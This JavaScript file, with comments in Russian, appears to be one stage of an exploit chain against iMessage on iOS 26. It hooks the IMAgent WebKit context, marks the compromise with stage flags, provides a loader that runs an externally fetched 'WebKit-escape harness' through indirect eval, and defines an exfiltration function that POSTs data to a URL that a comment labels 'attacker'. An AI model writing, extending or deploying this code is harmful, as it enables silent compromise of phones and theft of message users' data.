// ios26_imagent_hook.js — hook IMAgent (WebKit2) для перехвата JS-контекста iMessage.
//
// Цель: поймать момент, когда iMessage-пейлоад исполняется в IMAgent,
// и инжектнуть WebKit-escape harness (stage 3).
//
// Механика (через Frida / DYLD interpose на macOS, или через WebKit
// userContentController на iOS):
//   1. Перехват WKUserContentController / addScriptMessageHandler
//   2. Перехват -[IMAgent handleScript:] / evaluateJavaScript
//   3. Инжект window.__ios26_hook = true + запуск harness в том же контексте
//
// TODO: точные selector'ы зависят от версии iOS (26) — сверить с
// class-dump IMAgent.framework / WebKit.framework.

'use strict';

(function () {
    function log(...a) { console.log('[imagent-hook]', ...a); }

    // 1. Marker: контекст iMessage-скрипта
    window.__ios26_hook = true;
    window.__ios26_stage = 1;
    log('IMAgent context hooked, UA:', navigator.userAgent);

    // 2. Перехват evaluateJavaScript (если доступен через bridge)
    if (window.webkit && window.webkit.messageHandlers) {
        log('messageHandlers:', Object.keys(window.webkit.messageHandlers));
    }

    // 3. Запуск WebKit-escape harness (stage 3) — подгружается извне
    //    (ios26_webkit_hook.js или cassowary_harness.js)
    function loadHarness(src) {
        log('loading harness...');
        try {
            (0, eval)(src);
            window.__ios26_stage = 3;
            log('harness executed');
        } catch (e) {
            log('harness error:', e);
        }
    }
    window.__ios26_loadHarness = loadHarness;

    // 4. Exfil-канал (stage 7): fetch -> attacker
    window.__ios26_exfil = function (data, url) {
        try {
            fetch(url, { method: 'POST', body: String(data) })
                .then(() => log('exfil ok'))
                .catch(e => log('exfil fail', e));
        } catch (e) { log('exfil err', e); }
    };

    log('IMAgent hook ready');
})();
